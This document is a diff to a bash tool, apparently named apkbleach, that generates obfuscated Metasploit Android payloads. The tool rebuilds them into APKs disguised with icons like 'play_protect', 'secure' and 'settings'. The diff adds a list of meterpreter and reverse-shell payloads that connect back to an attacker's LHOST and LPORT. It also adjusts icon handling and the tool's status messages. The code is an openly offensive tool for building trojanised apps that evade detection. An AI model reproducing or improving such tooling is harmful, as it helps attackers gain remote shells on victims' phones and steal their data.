@@ -40,10 +40,10 @@ USAGE() {
     echo -e "${GREEN}Usage:${RESTORE} apkbleach ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use> ${YELLOW}-i${RESTORE}  <path/to/image.png> ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>\n
 ${GREEN}Options:${RESTORE}
   ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use>
-      ${YELLOW}Generates obfuscated payload with nops${RESTORE}
+      ${YELLOW}Generates obfuscated payload with nops use [ -g --list ] to list payloads${RESTORE}
   
-  ${YELLOW}-i${RESTORE}  <path/to/image.png> [ use -i --list ] to list defaults
-      ${YELLOW}Sets image as the icon of the file.apk${RESTORE}
+  ${YELLOW}-i${RESTORE}  <path/to/image.png>
+      ${YELLOW}Sets image as the icon of the file.apk use [ -i --list ] to list defaults${RESTORE}
   
   ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>
       ${YELLOW}Sets the name of custom output file${RESTORE}
@@ -73,6 +73,28 @@ while test $# -gt 0; do
         -g)
                 shift
                 if [ $# -gt 0 ]; then
+                    if [ $1 = "--list" ]; then
+                        echo -e "${YELLOW}PAYLOADS:${RESTORE}\n
+android/meterpreter/reverse_http
+${YELLOW}Run a meterpreter server in Android. Tunnel communication over HTTP${RESTORE}
+android/meterpreter/reverse_https
+${YELLOW}Run a meterpreter server in Android. Tunnel communication over HTTPS${RESTORE}
+android/meterpreter/reverse_tcp
+${YELLOW}Run a meterpreter server in Android. Connect back stager${RESTORE}
+android/meterpreter_reverse_http
+${YELLOW}Connect back to attacker and spawn a Meterpreter shell${RESTORE}
+android/meterpreter_reverse_https
+${YELLOW}Connect back to attacker and spawn a Meterpreter shell${RESTORE}
+android/meterpreter_reverse_tcp
+${YELLOW}Connect back to the attacker and spawn a Meterpreter shell${RESTORE}
+android/shell/reverse_http
+${YELLOW}Spawn a piped command shell (sh). Tunnel communication over HTTP${RESTORE}
+android/shell/reverse_https
+${YELLOW}Spawn a piped command shell (sh). Tunnel communication over HTTPS${RESTORE}
+android/shell/reverse_tcp 
+${YELLOW}Spawn a piped command shell (sh). Connect back stager${RESTORE}${RESTORE}"
+                        exit
+                   fi
                     export PAYLOAD=$1
                     export LHOST=$2
                     export LPORT=$3
@@ -98,10 +120,13 @@ while test $# -gt 0; do
                 shift
                 if [ $# -gt 0 ]; then
                   if [ $1 = "--list" ]; then
-                      echo -e "${YELLOW}ICONS: \n\nICONS/4g_signal.png\nICONS/settings.png\nICONS/signal.jpg\nICONS/secure.png\nICONS/android_studio.png\nICONS/play_protect.png"
+                      echo -e "${YELLOW}ICONS: \n\nBLEACH_4gsignal.png\nBLEACH_settings.png\nBLEACH_signal.jpg\nBLEACH_secure.png\nBLEACH_android_studio.png\nBLEACH_play_protect.png"
                       exit
+                  elif [ $(echo $1 | grep BLEACH*) ]; then
+                       export ICON_PATH=ICONS/$1
+                  else 
+                       export ICON_PATH=$1
                   fi
-                    export ICON_PATH=$1
                 else
                     echo -e "${RED}ERROR: ${YELLOW}Input png image not set${RESTORE}"
                     USAGE
@@ -165,8 +190,8 @@ fi
 
 # Decompile apk
 (apktool -q d $APP_PATH -o /tmp/apkbleach/Decompiled; sleep 3) &
-PROG_MESSAGE="Decompiling $(basename $APP_PATH)"
-COMP_MESSAGE="Decompiled $(basename $APP_PATH)"
+PROG_MESSAGE="Decompiling Android Application"
+COMP_MESSAGE="Decompiled Android Application"
 spinLoader;echo
 
 # Injecting custom icon if -i is set
@@ -177,8 +202,8 @@ iconInject() {
      convert -resize 48x48 $ICON_PATH /tmp/apkbleach/Decompiled/res/drawable-mdpi-v4/icon.png;
      convert -resize 36x36 $ICON_PATH /tmp/apkbleach/Decompiled/res/drawable-ldpi-v4/icon.png;
      sleep 3;) &
-    PROG_MESSAGE="Injecting custom icon"
-    COMP_MESSAGE="Injected custom icon"
+    PROG_MESSAGE="Injecting icon $(basename $ICON_PATH)"
+    COMP_MESSAGE="Injected icon $(basename $ICON_PATH)"
 }
 if [ ! -z $ICON_PATH ] && [ $(file $ICON_PATH 2>/dev/null | grep "image" &>/dev/null; echo $?) = 0 ]; then
     iconInject && spinLoader;echo
@@ -212,8 +237,8 @@ spinLoader;echo
 # Rebuild apk
 [[ -z $EXPORT_PATH ]] && DEFAULT=service.apk && APP_NAME=service.apk || DEFAULT=$OUTPUT_NAME
 (apktool -q b /tmp/apkbleach/Decompiled -o /tmp/apkbleach/temp.apk; sleep 3) &
-PROG_MESSAGE="Rebuilding $(basename $APP_PATH) as $DEFAULT"
-COMP_MESSAGE="Rebuilt $(basename $APP_PATH) as $DEFAULT"
+PROG_MESSAGE="Rebuilding Android Application"
+COMP_MESSAGE="Rebuilt Android Application as $DEFAULT"
 spinLoader;echo
  
 # Generate key,sign and align apk
